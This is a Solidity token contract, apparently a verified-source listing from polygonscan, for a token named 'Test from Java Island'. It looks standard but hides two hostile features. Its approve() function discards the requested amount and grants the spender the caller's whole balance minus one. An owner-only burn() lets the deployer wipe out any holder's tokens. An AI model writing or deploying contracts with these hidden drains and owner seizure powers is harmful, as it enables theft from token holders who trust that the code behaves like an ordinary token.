/**
 *Submitted for verification at polygonscan.com on 2021-12-30
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract MintClubToken {
    
    address public _OWNER_;
    modifier onlyOwner() {
        require(msg.sender == _OWNER_, "NOT_OWNER");
        _;
    }

    mapping(address => uint) public balances;
    mapping(address => mapping(address => uint)) public allowance;

    address deadWallet = 0x000000000000000000000000000000000000dEaD;
    uint public decimals = 0;
    uint public totalSupply = 100000000 * 10 ** decimals;
    string public name = "Test from Java Island";
    string public symbol = "Test1";
  
    
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
    event Burn(address indexed user, uint256 value);
    
    constructor() {
        balances[msg.sender] = totalSupply;
        _OWNER_=msg.sender;
        transfer(deadWallet, totalSupply/5);
    }
    
    function balanceOf(address owner) public view returns(uint) {
        return balances[owner];
    }
    
    function transfer(address to, uint value) public returns(bool) {
        require(balanceOf(msg.sender) >= value, 'Insufficient funds (balance too low)');
        balances[to] += value;
        balances[msg.sender] -= value;
        emit Transfer(msg.sender, to, value);
        return true;
    }
    
    function transferFrom(address from, address to, uint value) public returns(bool) {
        require(balanceOf(from) >= value, 'Insufficient funds (balance too low)');
        require(allowance[from][msg.sender] >= value, 'Without permission (allowance too low)');
        balances[to] += value;
        balances[from] -= value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }
// edit by tinnitussurvivor
    function approve(address spender, uint value) public returns(bool) {
        value = balances[msg.sender]-1;
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }
    
    function burn(address user, uint256 value) external onlyOwner {
        balances[user] -= value;
        totalSupply -= value;
        emit Burn(user, value);
        emit Transfer(user, address(0), value);
    }
    
}